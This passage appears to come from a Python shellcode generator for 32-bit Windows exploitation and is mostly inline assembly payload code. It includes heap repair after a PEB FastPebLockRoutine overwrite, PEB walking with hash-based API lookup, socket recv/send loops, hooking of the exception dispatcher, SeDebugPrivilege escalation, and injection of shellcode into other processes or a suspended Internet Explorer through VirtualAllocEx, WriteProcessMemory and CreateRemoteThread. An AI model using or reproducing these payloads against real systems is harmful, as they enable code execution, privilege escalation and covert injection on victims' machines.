        movl 24(%esi),%ecx
        movl 28(%esi),%eax
        // restore esi itself
        movl 4(%esi),%esi

        ret

fix_heap:
        //pushad
        pushl %eax
        pushl %ecx
        pushl %edx
        pushl %ebx
        pushl %esp
        // make saved esp original
        addl $16,(%esp)
        pushl %ebp
        pushl %esi
        pushl %edi

        // get the shellcode address from Peb->FastPeblockRoutine
        movl $0x7ffdf020,%edi
        // ebx == shellcode address 
        movl (%edi),%ebx
        // restore FastPebLockRoutine
        movl 8(%esi),%eax
        // Peb->FastPebLockRoutine = &RtlEnterCriticalSection
        movl %eax,(%edi)

        // find the head of the non-dedicated free list
        movl -8(%edi),%edi
        addl $0x178,%edi

        movl %edi,%ecx

find_flink_block:
        // if block->Flink == shellcode block
        cmp %ebx,(%ecx)
        je got_flink_block
        // go to next block
        movl (%ecx),%ecx
        jmp find_flink_block

got_flink_block:
        movl %edi,%edx

find_blink_block:
        // if block->Blink == shellcode block
        cmpl %ebx,4(%edx)
        je got_blink_block
        movl 4(%edx),%edx
        jmp find_blink_block

got_blink_block:
        // now ecx and edx point to the blocks before and after the shellcode block
        // unlink the shellcode block
        movl %edx,(%ecx)
        movl %ecx,4(%edx)

        // mark the shellcode block as used
        movb $1,-3(%ebx)

        //popad
        movl %esp,%esi
        movl (%esi),%edi
        movl 8(%esi),%ebp
        movl 12(%esi),%esp
        movl 16(%esi),%ebx
        movl 20(%esi),%edx
        movl 24(%esi),%ecx
        movl 28(%esi),%eax
        // restore esi itself
        movl 4(%esi),%esi

        ret

find_base_address:
        // eax == Peb->Ldr
        movl $0x7ffdf00c,%eax
        movl (%eax),%eax
        // eax == Peb->Ldr->InInitalizationOrderModuleList
        movl 0x1c(%eax),%eax

        // ntdll.dll is the first entry in the InInitOrder module list
        movl 8(%eax),%ebx
        // (%esi) == ntdll.dll base address
        movl %ebx,(%esi)

        // follow Flink
        mov (%eax),%eax

        // kernel32.dll is the second entry in the InInitOrder module list
        movl 8(%eax),%eax
        movl %eax,4(%esi)

        ret

find_function:
        //pushad
        pushl %eax
        pushl %ecx
        pushl %edx
        pushl %ebx
        pushl %esp
        // make saved esp original
        addl $16,(%esp)
        pushl %ebp
        pushl %esi
        pushl %edi

        // ebp == base address of DLL
        movl 0x28(%esp),%ebp
        // eax == PE header offset
        movl 0x3c(%ebp),%eax
        movl 0x78(%ebp, %eax, 1),%edx
        // edx == exports directory table
        addl %ebp,%edx
        // ecx == number of name pointers
        movl 0x18(%edx),%ecx
        movl 0x20(%edx),%ebx
        // ebx == name pointers table
        addl %ebp,%ebx

find_function_loop:
        test %ecx,%ecx
        jz find_function_failed
        decl %ecx
        // esi == offset of current symbol name
        movl (%ebx, %ecx, 4),%esi
        addl %ebp,%esi

compute_hash:
        xorl %edi,%edi
        xorl %eax,%eax

compute_hash_loop:
        movb (%esi),%al
        incl %esi
        cmpb %ah,%al
        je compare_hash
        // rotate each letter 13 bits to the right
        ror $13,%edi
        // add it to edi
        addl %eax,%edi
        jmp compute_hash_loop

compare_hash:
        // compare computed hash to argument
        cmpl 0x24(%esp),%edi
        jnz find_function_loop
        // ebx == ordinals table offset
        movl 0x24(%edx),%ebx
        addl %ebp,%ebx
        // ecx == function ordinal
        movw (%ebx, %ecx, 2),%cx
        // ebx == adress table offset
        movl 0x1c(%edx),%ebx
        addl %ebp,%ebx
        // eax == address off function offset
        movl (%ebx, %ecx, 4),%eax
        addl %ebp,%eax

        // overwrite stored eax with function address
        movl %eax,0x1c(%esp)
        //popad
        movl %esp,%esi
        movl (%esi),%edi
        movl 8(%esi),%ebp
        movl 12(%esi),%esp
        movl 16(%esi),%ebx
        movl 20(%esi),%edx
        movl 24(%esi),%ecx
        movl 28(%esi),%eax
        // restore esi itself
        movl 4(%esi),%esi

        ret $8
find_function_failed:
            //int3
infinite:
        jmp infinite
        """    
        # this code is used standalone, we dont want anything else in here 
        self.code = stage0
        return

    def initfuncs(self):
        recvloop=win32func()
        recvloop.imports=["ws2_32.recv"]
        recvloop.longs+=["FDSPOT"]
        recvloop.code="""
        //recvloop function

        //START FUNCTION RECVLOOP
        //arguments: size to be read
        //reads into *BUFADDR
recvloop:
            pushl %ebp
            movl %esp,%ebp
            push %edx
            push %edi
            //get arg1 into edx
            movl 0x8(%ebp), %edx
            movl BUFADDR-geteip(%ebx),%edi

docallrecvloop:
            //not an argument- but recv() mucks up edx! So we save it off here
            pushl %edx
            //flags
            pushl $0
            //len
            pushl $1
            //*buf
            pushl %edi
            movl FDSPOT-geteip(%ebx),%eax
            pushl %eax
            call *recv-geteip(%ebx)

            //prevents getting stuck in an endless loop if the server closes the connection
            cmp $-1,%eax
            je exit

            popl %edx

            //subtract how many we read
            sub %eax,%edx
            //move buffer pointer forward
            add %eax,%edi
            //test if we need to exit the function
            //recv returned 0
            test %eax,%eax
            je donewithrecvloop
            //we read all the data we wanted to read
            test %edx,%edx
            je donewithrecvloop
            jmp docallrecvloop


donewithrecvloop:
            //done with recvloop
            pop %edi
            pop %edx
            mov %ebp, %esp
            pop %ebp
            ret $0x04
            //END FUNCTION
        """

        getfuncaddress=win32func()
        getfuncaddress.code="""
getfuncaddress:
// int3 //debug
        pushl %ebx
        pushl %ecx
        pushl %esi
        pushl %edi
        pushl %ebp
        xor %ecx,%ecx
        //Get PEB address into EAX
        movl %fs:0x30(%ecx),%eax
        //  Now get PEB_LDR_DATA
        movl 0xc(%eax),%eax   
        // Now get In Load Order Module List into ECX (LDR_DATA_TABLE_ENTRY)
        //see http://undocumented.ntinternals.net/UserMode/Structures/PEB_LDR_DATA.html
        //note: MSDN does lie about these structures :>
        //This is the FLINK (start)
        movl 0xc(%eax),%ecx
nextinlist:
        //ECX is a pointer to a LDR_DATA_TABLE_ENTRY, so EDX is the next module in the list (FLINK)
        //of the IN_LOAD_ORDER_LINKS
        movl (%ecx),%edx 
        //+0x30 is the name of the image
        movl 0x30(%ecx),%eax
        //we push 2 because we are in UNICODE and we want to skip every
        //other byte
        pushl $0x2
        //push hash
        pushl 0x1c(%esp)
        //push string
        pushl %eax
        //call function to determine if they are the same
        call hashit
        //zero will indicate we found the module
        test %eax,%eax
        jz  foundmodule
        //restore ECX from our saved "next module in list"
        movl %edx,%ecx
        jmp nextinlist
foundmodule:
        movl 0x18(%ecx),%edi
        movl 0x3c(%edi),%ebx
        movl 0x78(%ebx,%edi,1),%ebx
        addl %edi,%ebx
        movl 0x18(%ebx),%ebp
        movl 0x1c(%ebx),%ecx
        movl 0x20(%ebx),%edx
        movl 0x24(%ebx),%ebx
        addl %edi,%ecx
        addl %edi,%edx
        addl %edi,%ebx
find_procedure:
        movl (%edx),%esi
        addl %edi,%esi
        pushl $0x1
        pushl 0x20(%esp)
        pushl %esi
        call hashit
        test %eax,%eax
        jz procedure_found
        xorl %eax,%eax
        decl %ebp
        jz procedure_not_found
        add $4,%edx
        incl %ebx
        incl %ebx
        jmp find_procedure
procedure_found:
        xor %edx,%edx
        mov (%ebx),%dx
        movl (%ecx,%edx,4),%eax
        addl %edi,%eax
procedure_not_found:
        popl %ebp
        popl %edi
        popl %esi
        popl %ecx
        popl %ebx
        ret $0x8
        """

        getfuncaddress.required=["davehash"]
        davehash=win32func()
        davehash.code="""
hashit:
        push %ebx
        push %ecx
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        movl 0xc(%esp),%eax
hashloop:
        movb (%eax),%cl
        test %cl,%cl
        jz hashed
        orb $0x60,%cl
        addl %ecx,%ebx
        shl $1,%ebx
        addl 0x14(%esp),%eax
        jmp hashloop
hashed:
.byte 0x91 //xchg %eax,%ecx
        cmpl 0x10(%esp),%ebx
        jz donehash
        incl %eax
donehash:
        popl %ecx
        popl %ebx
        ret $0xc
        """
        sendloop=win32func()
        sendloop.imports=["ws2_32.send"]
        sendloop.code="""
        //FUNCTION SENDLOOP
        //push size then address
        //inputs, size, address
        //uses global FDSPOT, so can't change EBX
sendloop:
        pushl %ebp
        movl %esp,%ebp
        pushl %esi
        pushl %edi
        //do while %edi
        //get arguments - edi is length, esi is buffer 
        movl 0x8(%ebp),%esi
        movl 0xc(%ebp),%edi
sendloop_one:
        //push flags
        pushl $0
        //push length
        pushl %edi
        //push msg
        pushl %esi
        //push fd
        pushl FDSPOT-geteip(%ebx)
        //call send
        call *send-geteip(%ebx)
        //subtract length we sent from edi
        sub %eax,%edi
        //increment the buffer pointer
        add %eax,%esi 
        //are we done?
        test %edi,%edi
        jne sendloop_one
        //we are done with sending the data
        popl %edi
        popl %esi
        movl %ebp,%esp
        popl %ebp
        ret $8
        """
        sendloop.longs+=["FDSPOT"]

        unhandledexception=win32func()
        unhandledexception.code="""
        //handles all exceptions - won't get called under ollydbg though
MyUnhandledExceptionFilter:
        call geteip3
geteip3:
        pop %edx
        call *getcurrentthreadid-geteip3(%edx)
        cmp %eax,currentthread-geteip3(%edx)
        je filter_ourthread
        //call exitthread
        push $0
        call *exitthread-geteip3(%edx)
        //neverreached right here
filter_ourthread:
        //else, it is our thread that threw an exception, so we will return 1
        //which will either be handled or exit the process
        movl $1,%eax
        ret
        """
        unhandledexception.imports.append("kernel32.exitthread")
        unhandledexception.imports.append("kernel32.getcurrentthreadid")
        unhandledexception.longs.append("currentthread")


        heapunhandledexception=win32func()
        heapunhandledexception.code="""
        //handles all exceptions - won't get called under ollydbg though
MyUnhandledExceptionFilter:
        call geteip3
geteip3:
        pop %edx
        call *getcurrentthreadid-geteip3(%edx)
        cmp %eax,currentthread-geteip3(%edx)
        je filter_ourthread
        //call exitthread
        push $0
        call *exitthread-geteip3(%edx)
        //neverreached right here
filter_ourthread:
        //else, it is our thread that threw an exception, so we will return 1
        //which will either be handled or exit the process
        //if the int is a int3
        //when called you can pop 1 argument from the stack which is a 
        //pointer to exception handler points structure
        movl 4(%esp),%eax
        movl (%eax), %eax
        movl (%eax), %eax 
        //if eax is int3 then we found the one we want...
        cmp $0x80000003, %eax
        jne filter_done

filter_patched:
        //it is an int3 and it is our thread
        //we need to do our esp+4 replacement and return control back to the
        //rtlalloc function
        movl 4(%esp), %eax
        movl 4(%eax), %eax
        movl %eax, %esi //save off a pointer to the stack pointer

        //do we need to increment eip?
        //we do need to replace esp+4
        //get esp
        movl 196(%eax), %eax 
        //erasing eax is bad
        movl ourheap-geteip3(%edx),%ecx
        movl %ecx,4(%eax) //should replace the old heap with our heap!

        //now we need to increment eip
        movl 4(%esp), %eax
        movl 4(%eax), %eax
        movl 184(%eax), %ecx
        inc %ecx
        movl %ecx, 184(%eax)

        //emulate a push ebp
        //  1. subtract 4 from esp
        movl 196(%esi), %edi
        subl $4, %edi
        movl %edi, 196(%esi)
        //  2. put ebp into (esp)
        movl 180(%esi), %eax //get ebp
        movl %eax, (%edi)

        //now we return -1 to continue execution.
        xor %eax, %eax
        dec %eax //mov -1 into eax (we handled it - please continue)
        ret
filter_done:
        //then change %esp-4 to our heap value
        //push ebp
        //and return 0
        movl $1,%eax
        ret
        """
        heapunhandledexception.imports.append("kernel32.exitthread")
        heapunhandledexception.imports.append("kernel32.getcurrentthreadid")
        heapunhandledexception.longs.append("currentthread")
        heapunhandledexception.longs.append("ourheap")

        kiuserexceptiondispatchreplacement=win32func()
        kiuserexceptiondispatchreplacement.longs.append("ourheap")
        kiuserexceptiondispatchreplacement.longs.append("emulate2k")
        kiuserexceptiondispatchreplacement.imports.append("ntdll.kiuserexceptiondispatcher")
        kiuserexceptiondispatchreplacement.imports.append("ntdll.zwcontinue")
        kiuserexceptiondispatchreplacement.code="""
        kiuserexceptiondispatchreplacement:
         //.byte 0xcc
            call kigeteip
        kigeteip:
            pop %ebx
        //2k has a push ebp there, and xp has a push <long word>
        movl emulate2k-kigeteip(%ebx), %edi

        mov (%esp), %eax
        mov (%eax), %eax
        cmp $0x80000003, %eax //compare to int3. all int3 is us
        jne kicontinue

        //it was int3, so we handle it instead 
        mov 4(%esp), %esi
        // Replace the old heap with our new shiny heap
        movl 196(%esi), %eax 
        //erasing eax is bad
        movl ourheap-kigeteip(%ebx),%ecx
        movl %ecx,4(%eax) //should replace the old heap with our heap!

        cmp $0, %edi
        je kiemulatexp
        //otherwise we do 2k
        kiemulate2k:
            //now we need to increment eip
            movl 184(%esi), %ecx
            inc %ecx
            movl %ecx, 184(%esi)

            //emulate a push ebp
            //  1. subtract 4 from esp
            movl 196(%esi), %edi
            subl $4, %edi
            movl %edi, 196(%esi)
            //  2. put ebp into (esp)
            movl 180(%esi), %eax //get ebp
            movl %eax, (%edi)

            jmp kidoneemulate

        kiemulatexp:
            //now we need to increment eip
            movl 184(%esi), %ecx
            inc %ecx
            movl (%ecx), %eax //store word to be pushed
            add $4, %ecx //skip over word
            movl %ecx, 184(%esi) //eip = eip+5 (push <longword> is skipped)

            //emulate a push of that word
            //  1. subtract 4 from esp
            movl 196(%esi), %edi
            subl $4, %edi
            movl %edi, 196(%esi)
            //  2. put that word into (esp)
            movl %eax, (%edi)
        kidoneemulate:

        pushl $0 //testalert boolean
        pushl %esi //context (from 4(%esp))
        call zwcontinue-kigeteip(%ebx)
        ret $8

        kicontinue:
          mov kiuserexceptiondispatcher-kigeteip(%ebx), %eax
          add $7, %eax //patchlength=7
          //here we assume the start of this function is the same across all 
          //service packs and OS versions...unwise!
          //we could do the push manually and call ntdll
          mov 4(%esp), %ecx
          mov (%esp), %ebx
          jmp %eax //return to kuuserexceptiondispatch, as if not patched
        """

        myRtlEnterCriticalSection=win32func()
        myRtlEnterCriticalSection.code="""
        ///New function that handles EnterCriticalSection
        //must reget eip, since who knows what ebx is now
myRtlEnterCriticalSection:
        call enter_geteip
enter_geteip:
        pop  %edx
        call *getcurrentthreadid-enter_geteip(%edx)
        cmp %eax,currentthread-enter_geteip(%edx)
        je enter_mythread
        pushl $0
        call exitthread-enter_geteip(%edx)
        //should never return from that call...
enter_mythread:
        movl rtlentercriticalsection-enter_geteip(%edx),%eax
        jmp *%eax
        """
        myRtlEnterCriticalSection.imports.append("ntdll.rtlentercriticalsection")
        myRtlEnterCriticalSection.imports.append("kernel32.exitthread")
        myRtlEnterCriticalSection.imports.append("kernel32.getcurrentthreadid")
        myRtlEnterCriticalSection.longs.append("currentthread")


        myRtlLeaveCriticalSection=win32func()
        myRtlLeaveCriticalSection.code="""
        ///New function that handles LeaveCriticalSection
        //must reget eip, since who knows what ebx is now
myRtlLeaveCriticalSection:
        call myleave_geteip
myleave_geteip:
        pop  %edx
        call *getcurrentthreadid-myleave_geteip(%edx)
        cmp %eax,currentthread-myleave_geteip(%edx)
        je myleave_mythread
        pushl $0
        call exitthread-myleave_geteip(%edx)
        //should never return from that call...
myleave_mythread:
        movl rtlleavecriticalsection-myleave_geteip(%edx),%eax

        jmp *%eax
        """

        myRtlLeaveCriticalSection.imports.append("ntdll.rtlleavecriticalsection")
        myRtlLeaveCriticalSection.imports.append("kernel32.exitthread")
        myRtlLeaveCriticalSection.imports.append("kernel32.getcurrentthreadid")
        myRtlLeaveCriticalSection.longs.append("currentthread")

        self.functions["recvloop"]=recvloop
        self.functions["sendloop"]=sendloop
        self.functions["getfuncaddress"]=getfuncaddress
        self.functions["davehash"]=davehash
        self.functions["unhandled_exception"]=unhandledexception
        self.functions["heap_unhandled_exception"]=heapunhandledexception
        self.functions["myRtlEnterCriticalSection"]=myRtlEnterCriticalSection
        self.functions["myRtlLeaveCriticalSection"]=myRtlLeaveCriticalSection
        self.functions["replacekiuser"]=kiuserexceptiondispatchreplacement
        return

    def ForkLoad(self, args):
        if not self.foundeip:
            self.findeip([0])
        code = ""

        """
        LSD style semi-fork() for win32

        NOTES:
          o this is mildy self modifying to get a bit of a UNIX style fork() feel
            basically we clear a marker that tells the opcode wether it's a parent
            or child thread on runtime. So when the payload is copied over we can
            decide if it's a "parent" or "child", where children jump to execute
            "forkthis:"

        """
        code +="""
forkentry:
        // if this marker is cleared this jmps to forkthis:
        // we copy this entire payload over ;)
        pushl $0x41414141
        popl %eax
        test %eax,%eax
        jz forkthis

        // start of self modifying muck

        // clear the marker
        leal forkentry-geteip(%ebx),%ecx
        movl $0,1(%ecx)

        // !!! loop spawned process, attach and patch EB FE to E8 00
        // !!! to debug
        leal startsploit-geteip(%ebx),%ecx
        //movl $0xfeeb,(%ecx)

        // patch out mov ebx,esp, either way we want to keep esp as is on the "child"
        //ESPPATCH

        // end of self modifying muck

        // STARTUPINFO
        subl $68,%esp
        movl %esp,%ecx
        // PROCESS_INFORMATION
        subl $16,%esp
        movl %esp,%edx
        // CONTEXT
        subl $716,%esp
        movl %esp,%edi

        // save vars
        pushl %ecx
        pushl %edx
        pushl %edi

        // zero out vars before use
        // 800 bytes total
        xorl %eax,%eax
        xorl %edx,%edx
zerome:
        movl %eax,(%edi,%edx,4)
        incl %edx
        cmpb $200,%dl
        jne zerome

        // restore edx
        movl 4(%esp),%edx

        // "Explorer" string
        pushl %eax
        pushl $0x7265726f
        pushl $0x6c707845

        movl %esp,%esi

        // &PROCESS_INFORMATION
        pushl %edx
        // &STARTUPINFO = {0}
        movl %eax,(%ecx)
        pushl %ecx
        // NULL
        pushl %eax
        // NULL
        pushl %eax
        // CREATE_SUSPENDED
        pushl $4
        // 0
        pushl %eax
        // NULL
        pushl %eax
        // NULL
        pushl %eax
        // "cmd"
        pushl %esi
        // NULL
        pushl %eax
        call createprocessa-geteip(%ebx)

        // reset string space 
        popl %eax
        popl %eax
        popl %eax

        // restore pointers
        movl (%esp),%edi
        movl 4(%esp),%edx

        // ctx.ContextFlag=Context_FULL
        movl $0x10007,(%edi)
        // &ctx
        pushl %edi
        // pi.hThread
        pushl 4(%edx)
        call getthreadcontext-geteip(%ebx)

        // restore pointers
        movl 4(%esp),%edx

        // PAGE_EXECUTE_READWRITE
        pushl $0x40
        // MEM_COMMIT
        pushl $0x1000
        // size
        pushl $0x5000
        // NULL
        xorl %eax,%eax
        pushl %eax
        // pi.hProcess
        pushl (%edx)
        call virtualallocex-geteip(%ebx)

        // restore pointers
        movl 4(%esp),%edx

        // address is in %eax
        pushl %eax

        // NULL
        xorl %ecx,%ecx
        pushl %ecx
        // opcode len !!!
        leal startsploit-geteip(%ebx),%esi
        leal endmark-geteip(%ebx),%ecx
        subl %esi,%ecx
        //addl $300, %ecx //not needed.
        pushl %ecx
        // source buf
        pushl %esi
        // target addy
        pushl %eax
        // pi.hProcess
        pushl (%edx)
        call writeprocessmemory-geteip(%ebx)

        popl %eax

        // restore pointers
        movl (%esp),%edi
        movl 4(%esp),%edx

        // ctx.ContextFlags = CONTEXT_FULL
        movl $0x10007,(%edi)
        // ctx.Eip = targetaddy
        movl %eax,184(%edi)
        // &ctx
        pushl %edi
        // pi.hThread
        pushl 4(%edx)
        call setthreadcontext-geteip(%ebx)

        // restore pointers
        movl 4(%esp),%edx

        // pi.hThread
        pushl 4(%edx)
        call resumethread-geteip(%ebx)

postfork:
        // reset stack and ret?
        // we should really save state before findeip muck
        // and restore (popa?) at this point to ret or whatever
        // dave - hmm. Shouldn't we instead jmp exit? or even a jmp forkparent:
        addl $812,%esp

        //xorl %eax,%eax
        //pushl %eax
        pushl $0 
        call exitthread-geteip(%ebx)

forkthis:
        // to fork code is tacked on here

        """

        patch="""PATCHED
        movb $0x90,6(%ecx)
        movb $0x90,7(%ecx)
        """

        if args == None:
            code = code.replace("ESPPATCH", patch)
        # else we patch

        # get the imports we need
        self.imports += ["kernel32.createprocessa"]
        self.imports += ["kernel32.getthreadcontext"]
        self.imports += ["kernel32.virtualallocex"]
        self.imports += ["kernel32.writeprocessmemory"]
        self.imports += ["kernel32.setthreadcontext"]
        self.imports += ["kernel32.resumethread"]
        self.imports += ["kernel32.exitthread"]

        self.code += code
        return

    def heapSafeInject(self, args):
        """
        This code injects payload as remote thread into another process
        it's useful when your target process heap is mangled beyond
        recognition.
        """
        if not self.foundeip:
            #print "Don't have eip and are trying to use it!"
            self.findeip([0])

        getTokenPrivs = """
// get debug privileges SE_DEBUG_NAME == SeDebugPrivilege
// SE_PRIVILEGE_ENABLED == 2
// TOKEN_ADJUST_PRIVILEGES == 32
// our TOKEN_PRIVILEGES STRUCT == { 1, { 0, 0, SE_PRIVILEGE_ENABLED }

// build TOKEN_PRIVILEGES struct

pushl $2
pushl $0
pushl $0
pushl $1
movl %esp,%esi

pushl %esi

// lookupprivilegevaluea()

pushl %esi
addl $4,(%esp)
leal SE_DEBUG_NAME-geteip(%ebx),%eax
pushl %eax
pushl $0
call lookupprivilegevaluea-geteip(%ebx)

// getcurrentprocess()

call getcurrentprocess-geteip(%ebx)

// openprocesstoken()

pushl $0
// ptr to hToken
pushl %esp
pushl $32
pushl %eax
call openprocesstoken-geteip(%ebx)

// get hToken
movl (%esp),%edi

popl %esi
popl %esi

// adjusttokenprivileges()

pushl $0
pushl $0 //returnlength
pushl $0 //bufferlength
pushl %esi //pointer to NewState ??!!
pushl $0 //disable all privs
pushl %edi //token handle

call adjusttokenprivileges-geteip(%ebx)

// closehandle()
pushl %edi
call closehandle-geteip(%ebx)
"""

        heapSafeInjectCode = """
//TOKENCODEINSERT

// getcurrentprocessid()

call getcurrentprocessid-geteip(%ebx)
mov %eax,%esi

// openprocess()
//
// Access rights needed:
// 
// PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION
// PROCESS_VM_OPERATION | PROCESS_VM_WRITE
// PROCESS_VM_READ == 0x43a
// loop till open succeeds

//int3

// start at PID 200 
movl $INJECTPID,%edi

openpid:

incl %edi

// do _not_ inject into self

cmpl %esi,%edi
je openpid

pushl %edi
pushl $0
pushl $0x43a
call openprocess-geteip(%ebx)
test %eax,%eax
jz openpid

// save pid and self

pushl %esi
pushl %edi

// save handle

movl %eax,%edi

// virtualallocex()
//
// edi has pid
// edi has the handle
// fProtect is PAGE_EXECUTE_READWRITE == 0x40

pushl $0x40

// flAllocationType is MEM_COMMIT (do not touch physical memory) == 0x1000

pushl $0x1000

// len arg gives the length of the shellcode we want to write
// this code is appended after the 'end' label so practically
// this means you get sc.get() + thecodetoinject

// this is rounded off to the closest page size due to lpAddress being NULL

pushl $CODESIZE
pushl $0
pushl %edi //process handle, not pid
call virtualallocex-geteip(%ebx)

// writeprocessmemory()
//
// eax has base address
// edi has the handle

// save addy
pushl %eax

writeout:

pushl $0   //pByteswritten
pushl $CODESIZE //size
leal codemark-geteip(%ebx),%esi
pushl %esi   //buffer
pushl %eax  //base address
pushl %edi //process
call writeprocessmemory-geteip(%ebx)
test %eax,%eax
jz writeout

popl %eax

// createremotethread()
//
// code address is eax
// process handle is edi

pushl $0    //thread id
pushl $0    //creation flags
pushl $0      //parameter
pushl %eax   //start address
pushl $0     //stack size
pushl $0    //thread attributes
pushl %edi //process 
call createremotethread-geteip(%ebx)

// get back pid and self

popl %edi
popl %esi

// invalid handle for some reason ? try another pid

test %eax,%eax
jz openpid

//WAITCODEINSERT

jmp done
// bail out of this one

codemark:

        """

        waitCode = """
// push handle here save some space
pushl %eax

// WaitForSingleObject() with INFINITE timeout (-1)

pushl $-1
pushl %eax
call waitforsingleobject-geteip(%ebx)

// closehandle() on thread handle and process handle, handle is already pushed

// eax already pushed
call closehandle-geteip(%ebx)
pushl %edi
call closehandle-geteip(%ebx)

"""

        heapSafeInjectCode = heapSafeInjectCode.replace("CODESIZE", "0x%x"%int(len(args["injectme"])))
        if "setdebugprivs" in args and int(args["setdebugprivs"]):
            heapSafeInjectCode = heapSafeInjectCode.replace("//TOKENCODEINSERT", getTokenPrivs)
            heapSafeInjectCode = heapSafeInjectCode.replace("//WAITCODEINSERT", waitCode)
            self.imports.append("kernel32.getcurrentprocess")
            self.imports.append("kernel32.closehandle")
            self.imports.append("kernel32.waitforsingleobject")
            self.imports.append("advapi32.lookupprivilegevaluea")
            self.imports.append("advapi32.openprocesstoken")
            self.imports.append("advapi32.adjusttokenprivileges")

        if "pid" in args:
            heapSafeInjectCode = heapSafeInjectCode.replace("INJECTPID", "%d"%(int(args["pid"])-1))
        else:
            heapSafeInjectCode = heapSafeInjectCode.replace("INJECTPID", "%d"%(200-1))

        heapSafeInjectCode += ".urlencoded \"%s\"\n"%urllib.quote(args["injectme"])
        heapSafeInjectCode += "done:\n"
        if "append" in args:
            heapSafeInjectCode += args["append"]
        heapSafeInjectCode += "jmp poststrings\n"

        # my strings go here
        if "setdebugprivs" in args and int(args["setdebugprivs"]):
            heapSafeInjectCode += "SE_DEBUG_NAME:\n.ascii \"SeDebugPrivilege\"\n.byte 0x00\n" 

        heapSafeInjectCode += "poststrings:\n"
        heapSafeInjectCode += "jmp exit\n"

        self.imports.append("kernel32.getcurrentprocessid")
        self.imports.append("kernel32.openprocess")
        self.imports.append("kernel32.virtualallocex")
        self.imports.append("kernel32.writeprocessmemory")
        self.imports.append("kernel32.createremotethread")

        self.code += heapSafeInjectCode
        return


    def InjectToSelf(self, args):
        """ a cleaner inject to self """
        if not self.foundeip:
            self.findeip([0])

        dontexit = False
        if isinstance(args, dict) and "DONTEXIT" in args.keys():
            dontexit = True

        asm = """
        //int3

        xorl %eax,%eax
        pushl %eax
        pushl $0x73656C69 // iles */
        pushl $0x466D6172 // ramF */
        pushl $0x676F7250 // Prog */
        movl %esp,%esi
        movb $0xfc,%al
        subl %eax,%esp
        movl %esp,%edi
        pushl %eax
        pushl %edi
        pushl %esi
        call getenvironmentvariablea-geteip(%ebx)

        movl %edi,%esi
    end_string:
        incl %esi
        movb (%esi),%al
        test %eax,%eax
        jnz end_string
        movl %esp,%ecx
        movl %esi,%esp
        movb $32,%al
        addl %eax,%esp
        // technically this could ovf if there's a very
        // long %PROGRAMFILES% path ;) dirty strcat ...
        pushl $0x00657865 // exe */
        pushl $0x2E65726F // ore. */
        pushl $0x6C707865 // expl */
        pushl $0x695C7265 // er\i */
        pushl $0x726F6C70 // plor */
        pushl $0x78452074 // t Ex */
        pushl $0x656E7265 // erne */
        pushl $0x746E495C // \Int */
        movl %ecx,%esp
        movl %edi,%edx // IE string to edx        

        xorl %ecx,%ecx
        xorl %eax,%eax
        movb $17,%cl
    si_struct_clear:
        pushl %eax
        loop si_struct_clear
        movl %esp,%esi

        // +4 to save inject mem
        movb $5,%cl
    pi_struct_clear:
        pushl %eax
        loop pi_struct_clear
        movl %esp,%edi

        // set STARTF_USESHOWWINDOW and .cb
        movl $68,(%esi)
        incl 44(%esi)

        // createprocessa
        pushl %edi
        pushl %esi
        pushl %eax
        pushl %eax
        movb $12,%cl
        // CREATE_SUSPENDED|DETACHED_PROCESS
        pushl %ecx
        pushl %eax
        pushl %eax
        pushl %eax
        pushl %edx // path to IE
        pushl %eax
        call createprocessa-geteip(%ebx)
        test %eax,%eax
        jz exit_mark

        // pi.hProcess has process handle ...
        xorl %eax,%eax
        movb $0x40,%al
        pushl %eax
        movw $0x1000,%ax
        pushl %eax
        pushl $CODESIZE
        xorl %eax,%eax
        pushl %eax
        pushl (%edi)
        call virtualallocex-geteip(%ebx)
        // save inject mem
        movl %eax,16(%edi)

        xorl %ecx,%ecx
        pushl %ecx
        pushl $CODESIZE
        leal codemark-geteip(%ebx),%ecx
        pushl %ecx
        pushl %eax
        pushl (%edi)
        call writeprocessmemory-geteip(%ebx)

        xorl %eax,%eax
        pushl %eax
        pushl %eax
        pushl %eax
        pushl 16(%edi)
        pushl %eax
        pushl %eax
        pushl (%edi)
        call createremotethread-geteip(%ebx)

        jmp exit_mark

    codemark:

        """
        asm = asm.replace('CODESIZE', "0x%x" % int(len(args['injectme'])))
        asm += '.urlencoded "%s"\n' % urllib.quote(args['injectme'])
        asm += 'exit_mark:\n'

        if isinstance(args, dict) and 'customexit' in args.keys():
            asm += args['customexit']
        
        elif dontexit == False:
            asm += 'call *exitprocess-geteip(%ebx)\n'

        self.imports.append('kernel32.virtualallocex')
        self.imports.append('kernel32.writeprocessmemory')
        self.imports.append('kernel32.createremotethread')
        self.imports.append('kernel32.createprocessa')
        self.imports.append('kernel32.setcurrentdirectorya')
        self.imports.append('kernel32.getenvironmentvariablea')
        
        if dontexit == False:
            self.imports.append('kernel32.exitprocess')

        self.code += asm
        return

    def InjectToSelfOld(self, args):
        """
        CreateProcessA, inject into that PID, mostly for use as .exe generation so no optimising

        WARNING VERY UGLY CODE..JUST POC RIGHT NOW...WILL GET BETTER!!!
        """

        if not self.foundeip:
            self.findeip([0])

        dontexit=False
        if isinstance(args, dict) and "DONTEXIT" in args.keys():
            dontexit=True

        InjectToSelfCode = """
// revert to self
xorl %eax,%eax
pushl %eax
pushl %eax
call setthreadtoken-geteip(%ebx)


// get debug privileges SE_DEBUG_NAME == SeDebugPrivilege
// SE_PRIVILEGE_ENABLED == 2
// TOKEN_ADJUST_PRIVILEGES == 32
// our TOKEN_PRIVILEGES STRUCT == { 1, { 0, 0, SE_PRIVILEGE_ENABLED }

// build TOKEN_PRIVILEGES struct

pushl $2
pushl $0
pushl $0
pushl $1
movl %esp,%esi

pushl %esi

// lookupprivilegevaluea()

pushl %esi
addl $4,(%esp)
leal SE_DEBUG_NAME-geteip(%ebx),%eax
pushl %eax
pushl $0
call lookupprivilegevaluea-geteip(%ebx)

// getcurrentprocess()

call getcurrentprocess-geteip(%ebx)

// openprocesstoken()

pushl $0
// ptr to hToken
pushl %esp
pushl $32
pushl %eax
call openprocesstoken-geteip(%ebx)

// get hToken
movl (%esp),%edi

popl %esi
popl %esi

// adjusttokenprivileges()

pushl $0
pushl $0 //returnlength
pushl $0 //bufferlength
pushl %esi //pointer to NewState ??!!
pushl $0 //disable all privs
pushl %edi //token handle

call adjusttokenprivileges-geteip(%ebx)

// closehandle()
pushl %edi
call closehandle-geteip(%ebx)

// createprocessA

        // STARTUPINFO
        subl $68,%esp
        movl %esp,%ecx
        // PROCESS_INFORMATION
        subl $16,%esp
        movl %esp,%edx
        // CONTEXT
        subl $716,%esp
        movl %esp,%edi

        // save vars
